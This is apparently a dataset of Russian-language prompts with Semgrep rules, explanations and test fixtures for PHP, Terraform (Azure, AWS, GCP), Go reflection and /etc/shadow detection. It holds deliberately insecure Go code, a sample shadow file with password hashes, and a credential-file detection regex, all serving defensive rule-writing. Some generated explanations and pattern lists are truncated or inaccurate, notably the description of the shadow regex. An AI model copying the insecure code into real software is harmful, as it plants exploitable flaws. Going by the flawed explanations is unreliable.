    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: empty-with-boolean-expression.php\n<?php\n\n// ok: empty-with-boolean-expression\nif (!empty($params['name']) && !empty($params['pass'])) {\n}\n// ruleid: empty-with-boolean-expression\nelseif (!empty($params['name'] && !empty($params['pass']))) {\n}\n\n// ok: empty-with-boolean-expression\nif (!empty($params['name']) || !empty($params['pass'])) {\n}\n// ruleid: empty-with-boolean-expression\nelseif (!empty($params['name'] || !empty($params['pass']))) {\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• empty($params['name'] && $params['pass'])\n• empty($a || $b)\n\nБезопасные паттерны:  \n• empty($params['name']) && empty($params['pass'])\n• empty($a) || empty($b)\n\nЛегенда аннотаций:\n- // ruleid:empty-with-boolean-expression: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:empty-with-boolean-expression: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: empty-with-boolean-expression\n  pattern-either:\n  - pattern: |\n      empty($A && $B)\n  - pattern: |\n      empty($A || $B)\n  message: >-\n    Calling `empty` on a boolean expression may be an indication that a parenthesis is misplaced.\n  metadata:\n    category: correctness\n    technology:\n    - php\n    confidence: LOW\n  languages: [php]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции empty() с булевыми выражениями внутри. В PHP булевы выражения могут быть неправильно заключены в круглые скобки, что приводит к неверному порядку операций. Правило использует pattern-either для охвата двух возможных шаблонов: 'empty($A && $B)' и 'empty($A || $B)', где $A и $B представляют собой переменные или выражения.\n\n# Ключевые элементы:\n- ID: empty-with-boolean-expression\n- Язык: php \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "empty-with-boolean-expression",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: azure-instance-extensions\nОписание уязвимости: Ensure Virtual Machine Extensions are not Installed\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-instance-extensions.tf\n# pass\nresource \"azurerm_linux_virtual_machine\" \"disabled\" {\n  admin_password      = \"admin\"\n  admin_username      = \"admin123\"\n  location            = \"azurerm_resource_group.test.location\"\n  name                = \"linux-vm\"\n  resource_group_name = \"azurerm_resource_group.test.name\"\n  size                = \"Standard_F2\"\n\n  network_interface_ids = [\n    \"azurerm_network_interface.test.id\"\n  ]\n\n  os_disk {\n    caching              = \"ReadWrite\"\n    storage_account_type = \"Standard_LRS\"\n  }\n\n  allow_extension_operations = false\n}\n\n# pass\nresource \"azurerm_windows_virtual_machine\" \"disabled\" {\n  admin_password      = \"admin\"\n  admin_username      = \"admin123\"\n  location            = \"azurerm_resource_group.test.location\"\n  name                = \"win-vm\"\n  resource_group_name = \"azurerm_resource_group.test.name\"\n  size                = \"Standard_F2\"\n\n  network_interface_ids = [\n    \"azurerm_network_interface.test.id\"\n  ]\n\n  os_disk {\n    caching              = \"ReadWrite\"\n    storage_account_type = \"Standard_LRS\"\n  }\n\n  allow_extension_operations = false\n}\n\n# fail\n# ruleid: azure-instance-extensions\nresource \"azurerm_linux_virtual_machine\" \"default\" {\n  admin_password      = \"admin\"\n  admin_username      = \"admin123\"\n  location            = \"azurerm_resource_group.test.location\"\n  name                = \"linux-vm\"\n  resource_group_name = \"azurerm_resource_group.test.name\"\n  size                = \"Standard_F2\"\n\n  network_interface_ids = [\n    \"azurerm_network_interface.test.id\"\n  ]\n\n  os_disk {\n    caching              = \"ReadWrite\"\n    storage_account_type = \"Standard_LRS\"\n  }\n}\n\n# fail\n# ruleid: azure-instance-extensions\nresource \"azurerm_linux_virtual_machine\" \"enabled\" {\n  admin_password      = \"admin\"\n  admin_username      = \"admin123\"\n  location            = \"azurerm_resource_group.test.location\"\n  name                = \"linux-vm\"\n  resource_group_name = \"azurerm_resource_group.test.name\"\n  size                = \"Standard_F2\"\n\n   # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_linux_virtual_machine\" \"default\" { ... allow_extension_operations = true }\n• resource \"azurerm_windows_virtual_machine\" \"enabled\" { ... allow_extension_operations = true }\n\nБезопасные паттерны:  \n• resource \"azurerm_linux_virtual_machine\" \"disabled\" { ... allow_extension_operations = false }\n• resource \"azurerm_windows_virtual_machine\" \"disabled\" { ... allow_extension_operations = false }\n\nЛегенда аннотаций:\n- // ruleid:azure-instance-extensions: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-instance-extensions: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-instance-extensions\n  message: >-\n    Ensure Virtual Machine Extensions are not Installed\n  patterns:\n  - pattern: resource\n  - pattern-either:\n    - pattern-inside: |\n        resource \"azurerm_linux_virtual_machine\" \"...\" {\n        ...\n        }\n    - pattern-inside: |\n        resource \"azurerm_windows_virtual_machine\" \"...\" {\n        ...\n        }\n  - pattern-not-inside: |\n      resource \"azurerm_linux_virtual_machine\" \"...\" {\n      ...\n      allow_extension_operations = false\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_windows_virtual_machine\" \"...\" {\n      ...\n      allow_extension_operations = false\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure виртуальных машин (Linux и Windows) с включенной возможностью установки расширений. В HCL-коде наличие ресурса virtual_machine с параметром allow_extension_operations=true считается опасным, так как это может привести к недостаточной гранулярности контроля доступа. Правило использует шаблон, который ищет ресурсы виртуальных машин и исключает случаи, когда параметр allow_extension_operations явно установлен в false.\n\n# Ключевые элементы:\n- ID: azure-instance-extensions\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-instance-extensions",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения aws-ec2-launch-template-metadata-service-v1-enabled\nОписание уязвимости: The EC2 launch template has Instance Metadata Service Version 1 (IMDSv1) enabled. IMDSv2 introduced session authentication tokens which improve security when talking to IMDS. You should either disable IMDS or require the use of IMDSv2.\nCWE: CWE-1390: Weak Authentication\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1390: Weak Authentication\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-ec2-launch-template-metadata-service-v1-enabled.tf\n# ruleid: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"fail_1\" {\n  name = \"example\"\n}\n\n# ruleid: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"fail_2\" {\n  name = \"example\"\n\n  metadata_options {\n    http_put_response_hop_limit = 2\n  }\n}\n\n# ruleid: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"fail_3\" {\n  name = \"example\"\n\n  metadata_options {\n    http_endpoint               = \"enabled\"\n    http_put_response_hop_limit = 2\n  }\n}\n\n# ruleid: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"fail_4\" {\n  name = \"example\"\n\n  metadata_options {\n    http_endpoint               = \"enabled\"\n    http_put_response_hop_limit = 2\n    http_tokens                 = \"optional\"\n  }\n}\n\n# ruleid: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"fail_5\" {\n  name = \"example\"\n\n  metadata_options {\n    http_put_response_hop_limit = 2\n    http_tokens                 = \"optional\"\n  }\n}\n\n# ok: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"pass_1\" {\n  name = \"example\"\n\n  metadata_options {\n    http_endpoint = \"disabled\"\n  }\n}\n\n# ok: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"pass_2\" {\n  name = \"example\"\n\n  metadata_options {\n    http_tokens = \"required\"\n  }\n}\n\n# ok: aws-ec2-launch-template-metadata-service-v1-enabled\nresource \"aws_launch_template\" \"pass_2\" {\n  name = \"example\"\n\n  metadata_options {\n    http_endpoint = \"enabled\"\n    http_tokens   = \"required\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { ... }\n\nБезопасные паттерны:  \n• resource \\\n•  \\\n•  { ... metadata_options { http_endpoint = \\\n\nЛегенда аннотаций:\n- // ruleid:aws-ec2-launch-template-metadata-service-v1-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-ec2-launch-template-metadata-service-v1-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-ec2-launch-template-metadata-service-v1-enabled\n  patterns:\n  - pattern: |\n      resource \"aws_launch_template\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_launch_template\" $ANYTHING {\n        ...\n        metadata_options {\n          ...\n          http_endpoint = \"disabled\"\n          ...\n        }\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_launch_template\" $ANYTHING {\n        ...\n        metadata_options {\n          ...\n          http_tokens = \"required\"\n          ...\n        }\n        ...\n      }\n  message: >-\n    The EC2 launch template has Instance Metadata Service Version 1 (IMDSv1)\n    enabled. IMDSv2 introduced session authentication tokens which improve security\n    when talking to IMDS. You should either disable IMDS or require the use of IMDSv2.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    cwe:\n    - 'CWE-1390: Weak Authentication'\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#metadata_options\n    - https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: MEDIUM\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS Launch Template в Terraform конфигурациях, где включена версия службы метаданных инстансов IMDSv1. Правило использует поисковый тип анализа (search) и проверяет наличие ресурса aws_launch_template с полем metadata_options, содержащим http_endpoint со значением 'enabled' и отсутствием полей http_tokens со значением 'required'. Безопасным считается случай, когда либо отключена служба метаданных инстансов (http_endpoint='disabled'), либо используется IMDSv2 (http_tokens='required').\n\n# Ключевые элементы:\n- ID: aws-ec2-launch-template-metadata-service-v1-enabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-ec2-launch-template-metadata-service-v1-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: gcp-postgresql-log-min-duration\nОписание уязвимости: Ensure PostgreSQL database 'log_min_duration_statement' flag is set to '-1'\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-postgresql-log-min-duration.tf\n# fail\n# ruleid: gcp-postgresql-log-min-duration\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"POSTGRES_12\"\n  name             = \"general-pos121\"\n  project          = \"gcp-bridgecrew-deployment\"\n  region           = \"us-central1\"\n  settings {\n    activation_policy = \"ALWAYS\"\n    availability_type = \"ZONAL\"\n    database_flags {\n      name  = \"log_checkpoints\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_connections\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_disconnections\"\n      value = \"off\"\n    }\n    database_flags {\n      name  = \"log_min_messages\"\n      value = \"debug6\"\n    }\n    database_flags {\n      name  = \"log_lock_waits\"\n      value = \"off\"\n    }\n    database_flags {\n      name  = \"log_temp_files\"\n      value = \"10\"\n    }\n    database_flags {\n      name  = \"log_min_duration_statement\"\n      value = \"1\"\n    }\n    pricing_plan = \"PER_USE\"\n    tier         = \"db-custom-1-3840\"\n  }\n}\n\n# ok: gcp-postgresql-log-min-duration\nresource \"google_sql_database_instance\" \"pass2\" {\n  database_version = \"POSTGRES_12\"\n  name             = \"general-pos121\"\n  project          = \"gcp-bridgecrew-deployment\"\n  region           = \"us-central1\"\n  settings {\n    activation_policy = \"ALWAYS\"\n    availability_type = \"ZONAL\"\n    database_flags {\n      name  = \"log_checkpoints\"\n      value = \"off\"\n    }\n    database_flags {\n      name  = \"log_connections\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_disconnections\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_min_messages\"\n      value = \"debug5\"\n    }\n    database_flags {\n      name  = \"log_lock_waits\"\n      value = \"on\"\n    }\n    database_flags {\n      name  = \"log_temp_files\"\n      value = \"0\"\n    }\n    database_flags {\n      name  = \"log_min_duration_statement\"\n      value = \"-1\"\n    }\n    pricing_plan = \"PER_USE\"\n    tier         = \"db-custom-1-3840\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_sql_database_instance\" \"fail\" { ... database_flags { name = \"log_min_duration_statement\" value = \"1\" } ... }\n• resource \"google_sql_database_instance\" \"another-fail\" { ... database_flags { name = \"log_min_duration_statement\" value = \"5\" } ... }\n\nБезопасные паттерны:  \n• resource \"google_sql_database_instance\" \"pass2\" { ... database_flags { name = \"log_min_duration_statement\" value = \"-1\" } ... }\n• resource \"google_sql_database_instance\" \"another-pass\" { ... database_flags { name = \"log_min_duration_statement\" value = \"-1\" } ... }\n\nЛегенда аннотаций:\n- // ruleid:gcp-postgresql-log-min-duration: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-postgresql-log-min-duration: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n    - id: gcp-postgresql-log-min-duration\n      patterns:\n        - pattern: resource\n        - pattern-inside: |\n              resource \"google_sql_database_instance\" \"...\" {\n                ...\n                database_flags {\n                  ...\n                }\n                ...\n              }\n        - pattern-not-inside: |\n              resource \"google_sql_database_instance\" \"...\" {\n                ...\n                database_flags {\n                  ...\n                  name  = \"log_min_duration_statement\"\n                  value = \"-1\"\n                  ...\n                }\n                ...\n              }\n      message: >-\n        Ensure PostgreSQL database 'log_min_duration_statement' flag is set to '-1'\n      metadata:\n        category: best-practice\n        technology:\n          - terraform\n          - gcp\n      languages: [hcl]\n      severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Google Cloud Platform (GCP) с использованием Terraform и языка HCL. Оно ищет ресурсы типа google_sql_database_instance и проверяет наличие параметра 'database_flags' с именем 'log_min_duration_statement'. Правило считает конфигурацию небезопасной, если значение этого флага не установлено в '-1', так как это может привести к недостаточной регистрации длительных запросов в журнале PostgreSQL.\n\n# Ключевые элементы:\n- ID: gcp-postgresql-log-min-duration\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-postgresql-log-min-duration",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения unsafe-reflect-by-name\nОписание уязвимости: If an attacker can supply values that the application then uses to determine which method or field to invoke, the potential exists for the attacker to create control flow paths through the application that were not intended by the application developers. This attack vector may allow the attacker to bypass authentication or access control checks or otherwise cause the application to behave in an unexpected manner.\nCWE: CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unsafe-reflect-by-name.go\npackage testing\n\nimport (\n    \"bytes\"\n    \"fmt\"\n    \"reflect\"\n)\n\nfunc (mf mapFmt) Format(s fmt.State, c rune, userInput string) {\n    refVal := mf.m\n    key := keys[i]\n    val := refVal.MapIndex(key)\n\n    // ruleid: unsafe-reflect-by-name\n    meth := key.MethodByName(userInput)\n    meth.Call(nil)[0]\n\n    return\n}\n\nfunc Test1(job interface{}, userInput string) {\n    jobData := make(map[string]interface{})\n\n    valueJ := reflect.ValueOf(job).Elem()\n\n    // ruleid: unsafe-reflect-by-name\n    jobData[\"color\"] = valueJ.FieldByName(userInput).String()\n\n    return jobData\n}\n\nfunc OkTest(job interface{}, userInput string) {\n    jobData := make(map[string]interface{})\n\n    valueJ := reflect.ValueOf(job).Elem()\n\n    // ok: unsafe-reflect-by-name\n    meth := valueJ.MethodByName(\"Name\")\n    // ok: unsafe-reflect-by-name\n    jobData[\"color\"] = valueJ.FieldByName(\"color\").String()\n\n    return jobData\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: unsafe-reflect-by-name\nmeth := key.MethodByName(userInput)\n• // ruleid: unsafe-reflect-by-name\njobData['color'] = valueJ.FieldByName(userInput).String()\n\nБезопасные паттерны:  \n• // ok: unsafe-reflect-by-name\nmeth := valueJ.MethodByName('Name')\n• // ok: unsafe-reflect-by-name\njobData['color'] = valueJ.FieldByName('color').String()\n\nЛегенда аннотаций:\n- // ruleid:unsafe-reflect-by-name: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unsafe-reflect-by-name: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: unsafe-reflect-by-name\n  patterns:\n  - pattern-either:\n    - pattern: |\n        $SMTH.MethodByName($NAME,...)\n    - pattern: |\n        $SMTH.FieldByName($NAME,...)\n  - pattern-not: |\n      $SMTH.MethodByName(\"...\",...)\n  - pattern-not: |\n      $SMTH.FieldByName(\"...\",...)\n  - pattern-inside: |\n      import \"reflect\"\n      ...\n  message: >-\n    If an attacker can supply values that the application then uses to determine which\n    method or field to invoke,\n    the potential exists for the attacker to create control flow paths through the\n    application\n    that were not intended by the application developers.\n    This attack vector may allow the attacker to bypass authentication or access control\n    checks\n    or otherwise cause the application to behave in an unexpected manner.\n  metadata:\n    cwe:\n    - \"CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')\"\n    owasp:\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  severity: WARNING\n  languages:\n  - go\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода reflect.MethodByName или reflect.FieldByName с переменной строкой ($NAME), которая может быть предоставлена пользователем. Это позволяет злоумышленнику контролировать выбор методов или полей во время выполнения приложения, потенциально обходя проверки авторизации или контроля доступа. Правило исключает случаи, когда строка жестко закодирована внутри кавычек, так как такие ситуации не представляют угрозы.\n\n# Ключевые элементы:\n- ID: unsafe-reflect-by-name\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "unsafe-reflect-by-name",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: detected-etc-shadow\nОписание уязвимости: linux shadow file detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-etc-shadow.txt\n# ruleid: detected-etc-shadow\nroot::17431:0:99999:7:::\ndaemon:*:17431:0:99999:7:::\nbin:*:17431:0:99999:7:::\nsys:*:17431:0:99999:7:::\nsync:*:17431:0:99999:7:::\ngames:*:17431:0:99999:7:::\nman:*:17431:0:99999:7:::\nlp:*:17431:0:99999:7:::\nmail:*:17431:0:99999:7:::\nnews:*:17431:0:99999:7:::\nuucp:*:17431:0:99999:7:::\nproxy:*:17431:0:99999:7:::\nwww-data:*:17431:0:99999:7:::\nbackup:*:17431:0:99999:7:::\nlist:*:17431:0:99999:7:::\nirc:*:17431:0:99999:7:::\ngnats:*:17431:0:99999:7:::\nnobody:*:17431:0:99999:7:::\nsshd:*:17431:0:99999:7:::\nubuntu:$6$LnUhhUi45srUKt9i$4Hp6VRTOB2mxvsYH8mwsCfBryg6hCbm4JJjV26KplN8ewZ7EUVqQDkLKDW.O8XRHx.B76JkwXtyD3wnAXEuZN1:0:99999:7:::  # Ограничиваем длину\n\nОпасные паттерны:\n• root::17431:0:99999:7:::\n• root:x:17431:0:99999:7:::\n\nБезопасные паттерны:  \n• user::17431:0:99999:7:::\n• daemon:*:17431:0:99999:7:::\n\nЛегенда аннотаций:\n- // ruleid:detected-etc-shadow: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-etc-shadow: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-etc-shadow\n  patterns:\n  - pattern-regex: ^(\\s*)(?P<ROOT>root:[x!*]*:[0-9]*:[0-9]*)\n  - focus-metavariable: $ROOT\n  languages: [regex]\n  message: linux shadow file detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    category: security\n    technology:\n    - secrets\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, начинающихся с 'root:' в файле /etc/shadow, за которыми следуют символы табуляции или пробела, а затем произвольная последовательность символов, кроме звездочки (*), восклицательного знака (!) и цифры x. Это соответствует записи пользователя root в файле /etc/shadow, которая может указывать на наличие жестко закодированных учетных данных. Правило также фокусируется на метавариабельной $ROOT, чтобы выделить найденную строку.\n\n# Ключевые элементы:\n- ID: detected-etc-shadow\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-etc-shadow",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  }
]